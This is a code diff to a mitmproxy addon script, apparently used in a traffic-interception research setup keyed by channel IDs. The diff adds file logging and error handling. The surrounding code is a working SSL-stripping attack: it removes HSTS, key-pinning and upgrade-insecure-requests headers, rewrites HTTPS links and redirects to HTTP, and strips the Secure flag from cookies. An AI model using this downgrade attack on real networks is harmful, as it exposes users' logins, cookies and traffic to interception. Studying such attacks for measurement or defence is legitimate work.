@@ -2,12 +2,15 @@ import collections
 import redis
 import time
 import re
+import os
 import urllib.parse
 import typing  # noqa
 import mitmproxy
 import logging
+import traceback
 from os.path import isfile, join
-
+from datetime import datetime
+import threading
 
 from enum import Enum
 from mitmproxy import ctx
@@ -194,29 +197,48 @@ def load(l):
         pass
     '''
 
+def my_log(*args):
+    global strip_log_file, lock_obj
+    s = '[{}] '.format(datetime.today())
+    s += ' '.join([str(v) for v in args])
+
+    print(s)
+    with lock_obj:
+        with open(strip_log_file, 'a') as fp:
+            print(s, file=fp)
 
 def configure(updated):
-    global tls_strategy, channel_id, data_dir, mitmableFileName, unMitmableFileNameIn, unMitmableFileNameOut
+    global tls_strategy, channel_id, data_dir, mitmableFileName, unMitmableFileNameIn, unMitmableFileNameOut,\
+        strip_log_file, lock_obj
     #if ctx.options.tlsstrat > 0:
     #    tls_strategy = ProbabilisticStrategy(float(ctx.options.tlsstrat) / 100.0)
     #else:
     #    tls_strategy = ConservativeStrategy()
-    channel_id = ctx.options.channel_id
-    data_dir = ctx.options.data_dir
+    try:
+        lock_obj = threading.Lock()
+        channel_id = ctx.options.channel_id
+        data_dir = ctx.options.data_dir
 
-    base_filename = '{}-{}'.format(
-        channel_id,
-        int(time.time())
-    )
-    mitmableFileName = str(data_dir) + "/mitmlog/" + str(base_filename) + '.mitmable'
-    unMitmableFileNameIn = join(UNMITMABLE_HOST_DIR, str(channel_id) + '.unmitmable')
-    unMitmableFileNameOut = str(data_dir) + "/mitmlog/" + str(channel_id) + '.unmitmable'
-    # unMitmableFileName = str(data_dir) + "/mitmlog/" + str(base_filename) + '.unmitmable'
-    LOG_FILE = str(data_dir) + "/mitmlog/" + str(base_filename) + '.strip'
-    #logging.basicConfig(filename=LOG_FILE,level=logging.DEBUG)
-    tls_strategy = ConservativeStrategy(unMitmableFileNameIn)
+        base_filename = '{}-{}'.format(
+            channel_id,
+            int(time.time())
+        )
+        mitmableFileName = os.path.join(str(data_dir), "mitmlog/") + str(base_filename) + '.mitmable'
+        unMitmableFileNameIn = join(UNMITMABLE_HOST_DIR, str(channel_id) + '.unmitmable')
+        unMitmableFileNameOut = os.path.join(str(data_dir), "mitmlog/") + str(channel_id) + '.unmitmable'
+        # unMitmableFileName = str(data_dir) + "/mitmlog/" + str(base_filename) + '.unmitmable'
+        tls_strategy = ConservativeStrategy(unMitmableFileNameIn)
 
-    #os.environ['SSLKEYLOGFILE'] = "~/.mitmproxy/sslkeylogfile.txt"
+        strip_log_dir = os.path.join(str(data_dir), "mitmlog/")
+        if not os.path.isdir(strip_log_dir):
+            mitmproxy.ctx.log("Error!!! Strip folder %s not found!" % strip_log_dir)
+        else:
+            strip_log_file = os.path.join(strip_log_dir, (str(base_filename) + '.strip'))
+        mitmproxy.ctx.log('Successfully loaded smart tls script!')
+        #os.environ['SSLKEYLOGFILE'] = "~/.mitmproxy/sslkeylogfile.txt"
+    except Exception as e:
+        mitmproxy.ctx.log('Error loading the smart tls script!')
+        traceback.print_exc()
 
 
 def next_layer(next_layer):
@@ -262,7 +284,7 @@ def request(flow: http.HTTPFlow) -> None:
 
     # do not force https redirection
     if flow.request.headers.pop('Upgrade-Insecure-Requests', None):
-        logging.info(
+        my_log(
             "SSLStrip - Removing header Upgrade-Insecure-Requests for %s" % flow.request.url)
 
     # proxy connections to SSL-enabled hosts
@@ -285,12 +307,11 @@ def response(flow: http.HTTPFlow) -> None:
     #    "debug")
     request_url = flow.request.url
     if flow.response.headers.pop('Strict-Transport-Security', None):
-        #mitmproxy.ctx.log(
-        logging.info(
+        my_log(
             "SSLStrip - Removing header Strict-Transport-Security for %s" %
             request_url)
     if flow.response.headers.pop('Public-Key-Pins', None):
-        logging.info(
+        my_log(
             "SSLStrip - Removing header Public-Key-Pins for %s:%s" % (request_url, repr(flow.response.port)))
 
 
@@ -302,11 +323,11 @@ def response(flow: http.HTTPFlow) -> None:
             for https_url in https_urls:
                 if "." not in https_url:  # exclude URLs like https://ssl
                     continue
-                logging.info(
+                my_log(
                     "SSLStrip - Will downgrade to HTTP %s %s" %
                     (https_url, request_url))
         except Exception:
-            logging.exception(
+            my_log(
                 "Error while extracting HTTPS links %s" % request_url)
 
     flow.response.content = flow.response.content.replace(b'https://', b'http://')
@@ -321,15 +342,15 @@ def response(flow: http.HTTPFlow) -> None:
         hostname = urllib.parse.urlparse(location).hostname
         if hostname:
             secure_hosts.add(hostname)
-            logging.info(
+            my_log(
             "Secure Host added: %s" % hostname)
-        logging.info("SSLStrip - Will downgrade Location header to HTTP %s %s" % (location, request_url))
+        my_log("SSLStrip - Will downgrade Location header to HTTP %s %s" % (location, request_url))
         flow.response.headers['Location'] = location.replace('https://', 'http://', 1)
 
 
     # strip upgrade-insecure-requests in Content-Security-Policy header
     if re.search('upgrade-insecure-requests', flow.response.headers.get('Content-Security-Policy', ''), flags=re.IGNORECASE):
-        logging.info(
+        my_log(
             "SSLStrip - upgrade-insecure-requests: %s %s" %
             (repr(flow.response.headers.get('Content-Security-Policy', '')),
              request_url))
@@ -342,8 +363,7 @@ def response(flow: http.HTTPFlow) -> None:
     if cookies:
         for s in cookies:
             if "secure" in s:
-                logging.info("SSLStrip - Stripping Secure Cookie: %s %s" %
+                my_log("SSLStrip - Stripping Secure Cookie: %s %s" %
                              (repr(s), request_url))
     cookies = [re.sub(r';\s*secure\s*', '', s) for s in cookies]
     flow.response.headers.set_all('Set-Cookie', cookies)
-
